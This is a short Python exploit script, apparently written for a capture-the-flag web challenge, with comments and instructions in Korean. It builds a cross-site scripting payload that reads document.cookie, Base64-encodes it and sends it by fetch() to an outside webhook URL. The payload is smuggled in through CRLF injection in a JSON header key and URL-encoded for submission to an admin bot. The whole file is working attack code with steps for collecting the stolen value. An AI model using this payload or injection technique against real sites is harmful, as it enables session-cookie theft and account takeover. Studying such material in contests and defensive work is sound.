import urllib.parse
import json

def generate_payload():
    print("[*] ==========================================")
    print("[*] Generating Payload for Remote Server...")
    print("[*] ==========================================")

    # 알려주신 웹훅 URL 적용 완료!
    WEBHOOK_URL = "https://webhooksite.net/5c337e9e-4316-4545-983b-ab895c23b065"
    
    # 1. 탈취한 쿠키(FLAG)를 Base64 인코딩하여 웹훅으로 전송하는 페이로드
    xss_payload = f"<script>fetch('{WEBHOOK_URL}/?flag='+btoa(document.cookie))</script>"
    print(f"[*] XSS Payload: {xss_payload}")

    # 2. 취약점 공략: Header 'Key' 위치에 CRLF(\r\n)와 페이로드 삽입
    malicious_data = {
        "context": {"user": "Guest"},
        "headers": {
            f"x-injected\r\n\r\n{xss_payload}": "dummy"
        }
    }

    # 3. JSON 변환 및 URL 인코딩
    json_data = json.dumps(malicious_data)
    encoded_data = urllib.parse.quote(json_data)
    bot_path = f"?data={encoded_data}"
    
    print(f"\n[DEBUG] Admin Bot Path payload:")
    print(f"    {bot_path}")

    print("\n[*] ==========================================")
    print("[*] [ACTION REQUIRED] Final Step for Remote!")
    print("[*] 1. 실제 대회 서버의 Admin Bot 페이지로 이동하세요.")
    print("[*] 2. 위에서 출력된 긴 Path 문자열(?data=...)을 봇에게 제출하세요.")
    print(f"[*] 3. 웹훅 대시보드({WEBHOOK_URL})를 새로고침하며 플래그를 기다리세요!")
    print("[*] 4. (참고) 플래그가 오면 브라우저 콘솔창에서 atob('Base64문자열')을 쳐서 디코딩하세요.")
    print("[*] ==========================================")

if __name__ == '__main__':
    generate_payload()